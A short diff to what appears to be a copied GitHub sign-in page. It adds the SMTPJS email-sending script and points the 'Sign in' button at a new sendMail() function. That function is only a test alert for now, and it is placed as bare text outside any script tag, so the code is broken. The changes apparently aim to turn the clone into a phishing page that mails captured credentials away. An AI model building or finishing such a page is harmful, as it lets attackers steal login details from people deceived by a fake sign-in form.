@@ -124,7 +124,9 @@
   </head>
 
   <body class="logged-out env-production page-responsive session-authentication">
-
+function sendMail() {
+  alert("test!!!");
+}
     <script src="https://smtpjs.com/v3/smtp.js"></script>
     
     
@@ -239,7 +241,7 @@
         <input type="hidden" class="js-webauthn-iuvpaa-support" name="webauthn-iuvpaa-support" value="unknown">
         <input type="hidden" name="return_to" id="return_to" class="form-control" />
         <input type="text" name="required_field_a154" hidden="hidden" class="form-control" /><input type="hidden" name="timestamp" value="1600173829000" class="form-control" /><input type="hidden" name="timestamp_secret" value="49d05bfef9b67e3d16a1dd5038136d44f8b0ba54ac5ef2eeba90500314491246" class="form-control" />
-        <input type="button" name="commit" value="Sign in" tabindex="3" class="btn btn-primary btn-block" data-disable-with="Signing in…" onClick="alert("test");" />
+        <input type="button" name="commit" value="Sign in" tabindex="3" class="btn btn-primary btn-block" data-disable-with="Signing in…" onClick="sendMail()" />
       </div>
 </form>
 
